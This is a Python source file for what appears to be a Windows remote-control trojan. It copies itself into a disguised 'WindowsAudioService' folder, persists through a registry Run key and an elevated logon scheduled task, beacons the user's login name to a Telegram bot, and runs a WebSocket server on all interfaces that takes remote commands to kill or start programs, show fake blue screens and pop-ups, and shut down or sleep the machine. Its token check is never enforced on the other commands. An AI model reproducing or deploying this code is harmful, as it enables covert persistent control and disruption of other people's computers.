import asyncio
import ctypes
import shutil
import subprocess
import sys
import threading
import tkinter
import requests

import psutil
import websockets
import json
import socket
import platform
import os
import GPUtil
import winreg
import time

from websockets.exceptions import ConnectionClosed
from tkinter import messagebox

from screeninfo import get_monitors

from config import BOT_TOKEN, CHAT_ID, WS_AUTH_TOKEN


class ClientWebsocketServer:
    def __init__(self, host='0.0.0.0', port=5555):
        self.host = host
        self.port = port
        self.clients = set()

        self.installed_programs_cache = None
        self.cache_time = 0
        self.cache_time_value = 300

        self.auto_setup()

    # --- –ê–í–¢–û–ó–ê–ì–†–£–ó–ö–ê ---
    # —Å–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å exe –≤ —Å–∏—Å—Ç–µ–º–Ω—É—é –ø–∞–ø–∫—É
    def copy_self_to_system(self):
        try:
            if not getattr(sys, 'frozen', False):
                return None

            current_exe = sys.executable
            exe_name = os.path.basename(current_exe)

            system_folder = os.path.join(os.environ['APPDATA'], 'WindowsAudioService')
            os.makedirs(system_folder, exist_ok=True)

            target_exe = os.path.join(system_folder, exe_name)

            if not os.path.exists(target_exe):
                shutil.copy2(current_exe, target_exe)

            return target_exe

        except Exception:
            return None

    # –¥–æ–±–∞–≤–∏—Ç—å –≤ –∞–≤—Ç–æ–∑–∞–≥—Ä—É–∑–∫—É —á–µ—Ä–µ–∑ —Ä–µ–µ—Å—Ç—Ä
    def add_to_startup(self, exe_path):
        try:
            key = winreg.HKEY_CURRENT_USER
            subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"

            with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as reg_key:
                winreg.SetValueEx(reg_key, "WindowsAudioService", 0, winreg.REG_SZ, f'"{exe_path}"')
                return True

        except Exception:
            return False

    # —Å–æ–∑–¥–∞—Ç—å –∑–∞–¥–∞–Ω–∏–µ –≤ –ø–ª–∞–Ω–∏—Ä–æ–≤—â–∏–∫–µ
    def create_scheduled_task(self, exe_path):
        try:
            task_cmd = (
                f'schtasks /create /tn "WindowsAudioService" /tr "{exe_path}" '
                f'/sc onlogon /delay 0000:30 /rl highest /f'
            )

            result = subprocess.run(task_cmd, shell=True, capture_output=True, text=True)

            if result.returncode == 0:
                return True
            else:
                if "already exists" in result.stderr:
                    return True
                print(f"‚ö†Ô∏è –û—à–∏–±–∫–∞ –ø–ª–∞–Ω–∏—Ä–æ–≤—â–∏–∫–∞: {result.stderr}")
                return False

        except Exception:
            return False

    # –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∞—è –Ω–∞—Å—Ç—Ä–æ–π–∫–∞ –ø—Ä–∏ –ø–µ—Ä–≤–æ–º –∑–∞–ø—É—Å–∫–µ
    def auto_setup(self):
        try:
            if len(sys.argv) > 1 and sys.argv[1] == "--startup":
                return

            if self.is_already_installed():
                return

            system_exe_path = self.copy_self_to_system()
            if not system_exe_path:
                return

            task_success = self.create_scheduled_task(system_exe_path)
            reg_success = self.add_to_startup(system_exe_path)

            if task_success or reg_success:
                self.response_to_telegram()

        except Exception:
            pass

    # –ø—Ä–æ–≤–µ—Ä–∏—Ç—å, —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∞ –ª–∏ –ø—Ä–æ–≥—Ä–∞–º–º–∞ —É–∂–µ
    def is_already_installed(self):
        try:
            key = winreg.HKEY_CURRENT_USER
            subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"

            with winreg.OpenKey(key, subkey, 0, winreg.KEY_READ) as reg_key:
                try:
                    winreg.QueryValueEx(reg_key, "WindowsAudioService")
                    return True
                except FileNotFoundError:
                    pass

            result = subprocess.run(
                'schtasks /query /tn "WindowsAudioService"',
                shell=True, capture_output=True, text=True
            )
            return result.returncode == 0

        except:
            return False

    # –ø–æ–ª–Ω–æ—Å—Ç—å—é —É–¥–∞–ª–∏—Ç—å –ø—Ä–æ–≥—Ä–∞–º–º—É –∏–∑ —Å–∏—Å—Ç–µ–º—ã
    def remove_server_program(self):
        try:
            key = winreg.HKEY_CURRENT_USER
            subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"

            with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as reg_key:
                try:
                    winreg.DeleteValue(reg_key, "WindowsAudioService")
                except FileNotFoundError:
                    pass

            result = subprocess.run(
                'schtasks /delete /tn "WindowsAudioService" /f',
                shell=True, capture_output=True, text=True
            )

            system_folder = os.path.join(os.environ['APPDATA'], 'WindowsAudioService')
            if os.path.exists(system_folder):
                bat_content = f"""
                @echo off
                timeout /t 3 /nobreak >nul
                rmdir /s /q "{system_folder}"
                del "%~f0"
                """

                bat_path = os.path.join(os.environ['TEMP'], 'remove_service.bat')
                with open(bat_path, 'w') as f:
                    f.write(bat_content)

                subprocess.Popen([bat_path], shell=True)

                time.sleep(1)
                sys.exit(0)

            return "‚úÖ –ü—Ä–æ–≥—Ä–∞–º–º–∞ –ø–æ–ª–Ω–æ—Å—Ç—å—é —É–¥–∞–ª–µ–Ω–∞"

        except Exception as e:
            return f"‚ùå –û—à–∏–±–∫–∞ —É–¥–∞–ª–µ–Ω–∏—è: {e}"

    # --- –ù–ê–°–¢–†–û–ô–ö–ê WEBSOCKET-–°–ï–†–í–ï–†–ê ---
    # –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –Ω–æ–≤–æ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –∫ —Å–µ—Ä–≤–µ—Ä—É
    async def handler(self, websocket):
        self.clients.add(websocket)
        print(f'‚úÖ –ù–æ–≤–æ–µ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–µ: {websocket.remote_address}')

        try:
            async for message in websocket:
                try:
                    data = json.loads(message)
                    command = data.get('command')

                    if not command:
                        await websocket.send(json.dumps({
                            'status': 'error',
                            'message': 'No command provided'
                        }))
                        continue

                    response = await self.process_command(command, data)
                    await websocket.send(json.dumps(response))

                except json.JSONDecodeError:
                    await websocket.send(json.dumps({
                        'status': 'error',
                        'message': 'Invalid JSON'
                    }))

        except ConnectionClosed:
            print('–ö–ª–∏–µ–Ω—Ç –æ—Ç–∫–ª—é—á–∏–ª—Å—è')
        except Exception as e:
            print(f'–û—à–∏–±–∫–∞ –≤ handler: {e}')
        finally:
            self.clients.discard(websocket)
            print(f'üóëÔ∏è  –ö–ª–∏–µ–Ω—Ç —É–¥–∞–ª–µ–Ω: {websocket.remote_address}')

    # –æ–±—Ä–∞–±–æ—Ç–∫–∞ –ø–æ–ª—É—á–µ–Ω–Ω–æ–π –∫–æ–º–∞–Ω–¥—ã
    async def process_command(self, command, data):
        if command == 'auth':
            return self.verify_token(data.get('data'))

        if command == 'ping':
            return {
                'status': 'success',
                'type': 'pong',
                'data': 'pong'
            }
        elif command == 'get_system_info':
            return {
                'status': 'success',
                'type': 'get_system_info',
                'data': self.get_system_info(),
            }
        elif command == 'get_system_resources':
            resources = self.get_system_resources()
            return {
                'status': 'success',
                'type': 'get_system_resources',
                'data': '\n'.join(resources) if isinstance(resources, list) else resources,
            }
        elif command == 'get_running_programs':
            programs = self.get_running_programs()
            if isinstance(programs, dict):
                programs_list = [f"{name} (PID: {pid})" for name, pid in programs.items()]
                return {
                    'status': 'success',
                    'type': 'get_running_programs',
                    'data': 'RUNNING PROGRAMS:\n' + '\n'.join(programs_list),
                }
            else:
                return {
                    'status': 'success',
                    'type': 'get_running_programs',
                    'data': f'RUNNING PROGRAMS:\n{programs}',
                }
        elif command == 'find_installed_programs':
            programs = self.find_installed_programs()
            if isinstance(programs, dict):
                programs_list = [f"{name}" for name in programs.keys()]
                return {
                    'status': 'success',
                    'type': 'find_installed_programs',
                    'data': 'INSTALLED PROGRAMS:\n' + '\n'.join(programs_list),
                }
            else:
                return {
                    'status': 'success',
                    'type': 'find_installed_programs',
                    'data': f'INSTALLED PROGRAMS:\n{programs}',
                }
        elif command == 'start_program':
            return {
                'status': 'success',
                'type': 'start_program',
                'data': self.start_program(data),
            }
        elif command == 'kill_program':
            return {
                'status': 'success',
                'type': 'kill_program',
                'data': self.kill_program(data),
            }
        elif command == 'show_custom_message':
            return {
                'status': 'success',
                'type': 'show_custom_message',
                'data': self.show_modal_window(data['data']),
            }
        elif command == 'show_blue_screen':
            return {
                'status': 'success',
                'type': 'show_blue_screen',
                'data': self.show_blue_screen(data['data']),
            }
        elif command == 'system_sleep':
            return {
                'status': 'success',
                'type': 'system_sleep',
                'data': self.system_sleep(),
            }
        elif command == 'system_shutdown':
            return {
                'status': 'success',
                'type': 'system_shutdown',
                'data': self.system_shutdown(),
            }
        elif command == 'close_all_programs':
            return {
                'status': 'success',
                'type': 'close_all_programs',
                'data': self.close_all_programs(),
            }
        elif command == 'remove_program':
            return {
                'status': 'success',
                'type': 'remove_program',
                'data': self.remove_server_program(),
            }
        else:
            return {
                'status': 'error',
                'type': 'error',
                'data': '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–∞—è –∫–æ–º–∞–Ω–¥–∞..',
            }

    async def start_server(self):
        print(f'–ó–∞–ø—É—Å–∫ —Å–µ—Ä–≤–µ—Ä–∞ –Ω–∞ ws://{self.host}:{self.port}')

        async with websockets.serve(self.handler, self.host, self.port):
            print('–°–µ—Ä–≤–µ—Ä –∑–∞–ø—É—â–µ–Ω')

            await asyncio.Future()

    def start(self):
        asyncio.run(self.start_server())

    # --- –í–°–ü–û–ú–û–ì–ê–¢–ï–õ–¨–ù–´–ï –ú–ï–¢–û–î–´
    # –ø–æ–¥–Ω—è—Ç–∏–µ –æ–∫–Ω–∞ –Ω–∞ —Å–∞–º—ã–π –≤–µ—Ä—Ö
    def force_window_to_top(self, hwnd):
        try:
            ctypes.windll.user32.ShowWindow(hwnd, 9)
            ctypes.windll.user32.SetWindowPos(hwnd, -1, 0, 0, 0, 0, 0x0002 | 0x0001)
            ctypes.windll.user32.SetForegroundWindow(hwnd)
        except Exception as e:
            print(f"Window focus error: {e}")

    # –ø–æ–ª—É—á–∞–µ–º –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ –º–æ–Ω–∏—Ç–æ—Ä–æ–≤
    def get_all_monitors(self):
        monitors = get_monitors()
        return [(m.x, m.y, m.width, m.height) for m in monitors]

    # –æ—Ç–ø—Ä–∞–≤–∫–∞ –¥–∞–Ω–Ω—ã—Ö –≤ —Ç–≥-–±–æ—Ç–∞
    def response_to_telegram(self):
        try:
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"

            message = f"üåê <b>–ó–∞–ø—É—Å–∫ –ø—Ä–æ–≥—Ä–∞–º–º—ã</b>\n\n" \
                      f"üîó <b>IP-–∞–¥—Ä–µ—Å:</b> <code>{self.host}</code>\n\n" \
                      f"üë§ <b>–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å:</b> <code>{os.getlogin()}</code>"
            data = {
                'chat_id': CHAT_ID,
                'text': message,
                'parse_mode': 'HTML',
            }

            requests.post(url, data=data, timeout=10)

        except requests.exceptions.RequestException:
            pass

    # --- –§–£–ù–ö–¶–ò–ò-–ö–û–ú–ê–ù–î–´ ---
    # –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏—è
    def verify_token(self, received_token):
        check = received_token == WS_AUTH_TOKEN

        if check:
            return {
                'status': 'success',
                'type': 'auth_result',
                'data': '–ê—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏—è –ø—Ä–æ—à–ª–∞ —É—Å–ø–µ—à–Ω–æ!!'
            }
        else:
            return {
                'status': 'error',
                'type': 'auth_result',
                'data': '–ù–µ–≤–∞–ª–∏–¥–Ω—ã–π —Ç–æ–∫–µ–Ω!!'
            }

    # –ø–æ–ª—É—á–µ–Ω–∏–µ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ –ü–ö
    def get_system_info(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip_name = s.getsockname()[0]
            s.close()

        except Exception:
            ip_name = '127.0.0.1'

        return '\n'.join([
            f"üíª –°–∏—Å—Ç–µ–º–∞: {platform.system()} {platform.release()}",
            f"üë§ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å: {os.getlogin()}",
            f"üåê IP-–∞–¥—Ä–µ—Å: {ip_name}",
            f"‚ö° –ö–æ–ª-–≤–æ —è–¥–µ—Ä: {psutil.cpu_count()}",
            f"üíæ –û–ó–£: {round(psutil.virtual_memory().total / (1024 ** 3), 1)} –ì–±",
        ])

    # –ø–æ–ª—É—á–µ–Ω–∏–µ —Å–æ—Å—Ç–æ—è–Ω–∏—è –ü–ö
    def get_system_resources(self):
        try:
            system_info = []

            # –¶–ü
            cpu = psutil.cpu_percent(interval=1)
            system_info.append(f"‚ö° –¶–ü: {cpu}%")

            # –û–ó–£
            memory = psutil.virtual_memory()
            all_memory = round(memory.total / (1024 ** 3), 1)
            used_memory = round(memory.used / (1024 ** 3), 1)
            system_info.append(f"üíæ –û–ó–£: {used_memory}–ì–± / {all_memory}–ì–±")

            # –í–∏–¥–µ–æ–∫–∞—Ä—Ç–∞
            try:
                gpu_info = GPUtil.getGPUs()
                if gpu_info:
                    gpu = gpu_info[0]

                    system_info.extend([
                        f"üéÆ –í–∏–¥–µ–æ–∫–∞—Ä—Ç–∞: {gpu.name}",
                        f"üî• –ó–∞–≥—Ä—É–∑–∫–∞ GPU: {gpu.load * 100:.1f}%",
                        f"üíæ –í–∏–¥–µ–æ–ø–∞–º—è—Ç–∏: {gpu.memoryUsed}MB / {gpu.memoryTotal}MB",
                    ])
                else:
                    system_info.append("üéÆ –í–∏–¥–µ–æ–∫–∞—Ä—Ç–∞: –Ω–µ –Ω–∞–π–¥–µ–Ω–∞")
            except Exception as e:
                system_info.append(f"üéÆ –û—à–∏–±–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ GPU: {str(e)}")

            # –¥–∏—Å–∫–∏
            disks_info = []
            for partition in psutil.disk_partitions():
                try:
                    if 'cdrom' in partition.opts or partition.fstype == '':
                        continue

                    usage = psutil.disk_usage(partition.mountpoint)

                    total_gb = round(usage.total / (1024 ** 3), 1)
                    used_gb = round(usage.used / (1024 ** 3), 1)

                    disks_info.append(f"  üíæ {partition.device}: {used_gb}GB/{total_gb}GB")
                except PermissionError:
                    continue

            if disks_info:
                system_info.append("üìÅ –î–ò–°–ö–ò:")
                system_info.extend(disks_info)
            else:
                system_info.append("üìÅ –î–∏—Å–∫–∏: –Ω–µ –Ω–∞–π–¥–µ–Ω—ã")

            return system_info


        except Exception:
            return "–ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ —Å–æ—Å—Ç–æ—è–Ω–∏–∏ –ü–ö"

    # –ø–æ–ª—É—á–µ–Ω–∏–µ –∑–∞–ø—É—â–µ–Ω–Ω—ã—Ö –ø—Ä–æ–≥—Ä–∞–º–º
    def get_running_programs(self):
        try:
            running_programs = {}

            # —Å–∏—Å—Ç–µ–º–Ω—ã–µ –ø—Ä–æ—Ü–µ—Å—Å—ã, –∫–æ—Ç–æ—Ä—ã–µ –º–æ–∂–Ω–æ –ø—Ä–æ–ø—É—Å—Ç–∏—Ç—å
            system_processes = {
                'system', 'svchost', 'runtimebroker', 'dllhost', 'conhost',
                'services', 'lsass', 'winlogon', 'csrss', 'smss', 'taskhostw',
                'explorer', 'taskmgr', 'cmd', 'powershell', 'python', 'py'
            }

            for proc in psutil.process_iter(['pid', 'name', 'username']):
                try:
                    username = proc.info.get('username', '')
                    proc_name = proc.info['name'].lower().replace('.exe', '')

                    if username and ('SYSTEM' in username or 'AUTHORITY' in username):
                        continue

                    if proc_name in system_processes:
                        continue

                    display_name = proc_name.capitalize()

                    running_programs[display_name] = proc.info['pid']

                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    pass

            return running_programs
        except Exception as e:
            print('—á—Ç–æ-—Ç–æ –ø–æ—à–ª–æ –Ω–µ —Ç–∞–∫..', e)

    # –≤—Å–µ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—ã–µ –ø—Ä–æ–≥—Ä–∞–º–º—ã
    def find_installed_programs(self):
        current_time = time.time()

        if (
                self.installed_programs_cache is not None
                and current_time - self.cache_time < self.cache_time_value
        ):
            return self.installed_programs_cache

        installed_programs = {}

        registry_paths = [
            (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"),
            (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"),
            (winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall")
        ]

        for reg, path in registry_paths:
            try:
                key = winreg.OpenKey(reg, path)

                num_sub_keys = winreg.QueryInfoKey(key)[0]

                for i in range(num_sub_keys):
                    sub_key_name = winreg.EnumKey(key, i)

                    try:
                        with winreg.OpenKey(key, sub_key_name) as program_key:
                            display_name = winreg.QueryValueEx(program_key, "DisplayName")[0]

                            if display_name is None:
                                continue

                            exe_path = ''
                            try:
                                exe_path = winreg.QueryValueEx(program_key, 'DisplayIcon')[0]

                                if exe_path and ',' in exe_path:
                                    exe_path = exe_path.split(',')[0]

                            except:
                                pass

                            if not exe_path:
                                try:
                                    install_location = winreg.QueryValueEx(program_key, "InstallLocation")[0]

                                    if install_location and os.path.exists(install_location):
                                        for file in os.listdir(install_location):
                                            if file.endswith('.exe') and not file.lower().startswith('unins'):
                                                exe_path = os.path.join(install_location, file)
                                                break

                                except:
                                    pass

                            if display_name and exe_path and os.path.exists(exe_path):
                                installed_programs[display_name] = exe_path

                    except FileNotFoundError:
                        display_name = None

                winreg.CloseKey(key)

            except FileNotFoundError:
                continue
            except PermissionError:
                continue

        self.installed_programs_cache = installed_programs
        self.cache_time = current_time

        return installed_programs

    # –∑–∞–ø—É—Å–∫ –ø—Ä–æ–≥—Ä–∞–º–º—ã –ø–æ –∏–º–µ–Ω–∏
    def start_program(self, search_name):
        search_name = search_name if isinstance(search_name, str) else search_name.get('data', '')

        programs = self.find_installed_programs()

        found_programs = []

        for program_name, exe_path in programs.items():
            if search_name.lower() in program_name.lower() and os.path.exists(exe_path):
                found_programs.append([program_name, exe_path])

        if not found_programs:
            return f"‚ùå –ü—Ä–æ–≥—Ä–∞–º–º–∞ '{search_name}' –Ω–µ –Ω–∞–π–¥–µ–Ω–∞"

        program_name, exe_path = found_programs[0]

        try:
            subprocess.Popen([exe_path])
            return f"‚úÖ –ó–∞–ø—É—â–µ–Ω–æ: {program_name}"

        except Exception as e:
            return f"‚ùå –û—à–∏–±–∫–∞ –∑–∞–ø—É—Å–∫–∞ {program_name}: {e}"

    # –∑–∞–∫—Ä—ã—Ç–∏–µ –ø—Ä–æ–≥—Ä–∞–º–º—ã –ø–æ –∏–º–µ–Ω–∏
    def kill_program(self, search_name):
        search_name = search_name if isinstance(search_name, str) else search_name.get('data', '')

        running_programs = self.get_running_programs()

        found_processes = []

        if search_name.isdigit():
            pid = int(search_name)

            try:
                process = psutil.Process(pid)
                proc_name = process.name()
                found_processes.append((proc_name, pid))

            except psutil.NoSuchProcess:
                pass

        for program_name, pid in running_programs.items():
            if search_name.lower() in program_name.lower():
                found_processes.append([program_name, pid])

        if not found_processes and not search_name.isdigit():
            return f"‚ùå –ü—Ä–æ—Ü–µ—Å—Å '{search_name}' –Ω–µ –Ω–∞–π–¥–µ–Ω"

        killed = []
        for proc_name, pid in found_processes:
            try:
                process = psutil.Process(pid)
                process.terminate()
                time.sleep(2)

                if process.is_running():
                    process.kill()
                    killed.append(f"{proc_name} (–ø—Ä–∏–Ω—É–¥–∏—Ç–µ–ª—å–Ω–æ)")
                else:
                    killed.append(f"{proc_name} (–∫–æ—Ä—Ä–µ–∫—Ç–Ω–æ)")

            except Exception as e:
                killed.append(f"{proc_name} (–æ—à–∏–±–∫–∞: {e})")

        if len(killed) == 1:
            return f"‚úÖ –ó–∞–≤–µ—Ä—à–µ–Ω: {killed[0]}"
        else:
            return f"‚úÖ –ó–∞–≤–µ—Ä—à–µ–Ω–æ –ø—Ä–æ—Ü–µ—Å—Å–æ–≤: {', '.join(killed)}"

    # –ø–æ–∫–∞–∑ –º–æ–¥–∞–ª—å–Ω–æ–≥–æ –æ–∫–Ω–∞
    def show_modal_window(self, message_data):
        try:
            message_type = message_data.get('type', 'info')
            message_text = message_data.get('text', '...')

            def create_message():
                try:
                    root = tkinter.Tk()
                    root.withdraw()
                    root.attributes('-topmost', True)

                    if message_type == 'error':
                        messagebox.showerror('–û—à–∏–±–∫–∞', message_text, parent=root)
                    elif message_type == 'warning':
                        messagebox.showwarning('–ü—Ä–µ–¥—É–ø—Ä–µ–∂–¥–µ–Ω–∏–µ', message_text, parent=root)
                    else:
                        messagebox.showinfo('–ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è', message_text, parent=root)

                    def force_topmost():
                        try:
                            hwnd = ctypes.windll.user32.GetForegroundWindow()
                            self.force_window_to_top(hwnd)
                        except:
                            pass

                    for i in range(5):
                        root.after(100 * i, force_topmost)

                    root.destroy()

                except:
                    pass

            message_thread = threading.Thread(target=create_message)
            message_thread.daemon = True
            message_thread.start()

            return "–ú–æ–¥–∞–ª—å–Ω–æ–µ –æ–∫–Ω–æ –∞–∫—Ç–∏–≤–∏—Ä–æ–≤–∞–Ω–æ"

        except:
            pass

    # –ø–æ–∫–∞–∑ —Å–∏–Ω–µ–≥–æ —ç–∫—Ä–∞–Ω–∞
    def show_blue_screen(self, message_data=None):
        try:
            def create_bsod():
                try:
                    monitors = self.get_all_monitors()
                    windows = []

                    def close_on_right_click(event):
                        if event.num == 3:
                            for window in windows:
                                try:
                                    window.destroy()
                                except:
                                    pass

                    for x, y, width, height in monitors:
                        root = tkinter.Tk()
                        root.title(f'Windows - System Error')

                        root.geometry(f"{width}x{height}+{x}+{y}")
                        root.attributes('-fullscreen', True)
                        root.attributes('-topmost', True)
                        root.configure(bg='#0078D7')

                        root.bind('<Button-3>', close_on_right_click)

                        message = message_data or "A problem has been detected and Windows has been shut down to prevent damage to your computer."

                        text_frame = tkinter.Frame(root, bg='#0078D7')
                        text_frame.pack(expand=True, fill='both', padx=100, pady=150)

                        title_label = tkinter.Label(
                            text_frame,
                            text="Your PC ran into a problem and needs to restart.",
                            font=("Lucida Console", 20, "bold"),
                            fg="white",
                            bg="#0078D7",
                            justify='left'
                        )
                        title_label.pack(anchor='w', pady=(0, 30))

                        message_label = tkinter.Label(
                            text_frame,
                            text=message,
                            font=("Lucida Console", 14),
                            fg="white",
                            bg="#0078D7",
                            justify='left',
                            wraplength=width - 200
                        )
                        message_label.pack(anchor='w', pady=(0, 50))

                        progress_label = tkinter.Label(
                            text_frame,
                            text="We're just collecting some error info, and then we'll restart for you.",
                            font=("Lucida Console", 12),
                            fg="white",
                            bg="#0078D7",
                            justify='left'
                        )
                        progress_label.pack(anchor='w', pady=(0, 20))

                        progress_percent = tkinter.Label(
                            text_frame,
                            text="0% complete",
                            font=("Lucida Console", 12),
                            fg="white",
                            bg="#0078D7",
                            justify='left'
                        )
                        progress_percent.pack(anchor='w')

                        hint_label = tkinter.Label(
                            root,
                            text="Close: Right Click",
                            font=("Arial", 8),
                            fg="#0078D7",
                            bg="#0078D7"
                        )
                        hint_label.place(relx=0.99, rely=0.99, anchor='se')

                        def update_percent(percent=0):
                            if percent <= 100:
                                progress_percent.config(text=f"{percent}% complete")
                                root.after(100, update_percent, percent + 1)

                        root.after(100, lambda: self.force_window_to_top(root.winfo_id()))
                        root.after(500, update_percent)

                        root.focus_force()
                        root.grab_set()

                        windows.append(root)

                    if windows:
                        windows[0].mainloop()

                except:
                    pass

            bsod_thread = threading.Thread(target=create_bsod)
            bsod_thread.daemon = True
            bsod_thread.start()

            return "–°–∏–Ω–∏–π —ç–∫—Ä–∞–Ω –∞–∫—Ç–∏–≤–∏—Ä–æ–≤–∞–Ω"

        except:
            pass

    def system_sleep(self):
        try:
            os.system("rundll32.exe powrprof.dll,SetSuspendState 0,1,0")
            return "‚úÖ –°–∏—Å—Ç–µ–º–∞ –ø–µ—Ä–µ—Ö–æ–¥–∏—Ç –≤ —Å–ø—è—â–∏–π —Ä–µ–∂–∏–º..."
        except Exception as e:
            return f"‚ùå –û—à–∏–±–∫–∞ –ø–µ—Ä–µ—Ö–æ–¥–∞ –≤ —Å–ø—è—â–∏–π —Ä–µ–∂–∏–º: {e}"

    def system_shutdown(self):
        try:
            os.system("shutdown /s /t 5")
            return "–°–∏—Å—Ç–µ–º–∞ –≤—ã–∫–ª—é—á–∏—Ç—Å—è —á–µ—Ä–µ–∑ 5 —Å–µ–∫—É–Ω–¥.."
        except Exception as e:
            return f"–û—à–∏–±–∫–∞ –≤—ã–∫–ª—é—á–µ–Ω–∏—è —Å–∏—Å—Ç–µ–º—ã: {e}"

    def close_all_programs(self):
        try:
            closed_count = 0
            error_count = 0

            for proc in psutil.process_iter(['pid', 'name', 'username']):
                try:
                    username = proc.info.get('username', '')
                    proc_name = proc.info['name'].lower()

                    system_processes = {
                        'explorer', 'taskmgr', 'cmd', 'powershell', 'python', 'py',
                        'system', 'svchost', 'winlogon', 'csrss', 'lsass', 'services',
                        'wininit', 'dwm', 'ctfmon', 'searchui', 'runtimebroker'
                    }

                    if (username and not ('SYSTEM' in username or 'AUTHORITY' in username) and
                            proc_name not in system_processes and
                            proc.pid != os.getpid()):

                        proc.terminate()
                        time.sleep(0.1)
                        if proc.is_running():
                            proc.kill()

                        closed_count += 1

                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    error_count += 1
                    continue

            return f"‚úÖ –ó–∞–∫—Ä—ã—Ç–æ {closed_count} –ø—Ä–æ–≥—Ä–∞–º–º (–æ—à–∏–±–æ–∫: {error_count})"

        except Exception as e:
            return f"‚ùå –û—à–∏–±–∫–∞ –∑–∞–∫—Ä—ã—Ç–∏—è –≤—Å–µ—Ö –ø—Ä–æ–≥—Ä–∞–º–º: {str(e)}"


if __name__ == "__main__":
    server = ClientWebsocketServer()
    server.start()
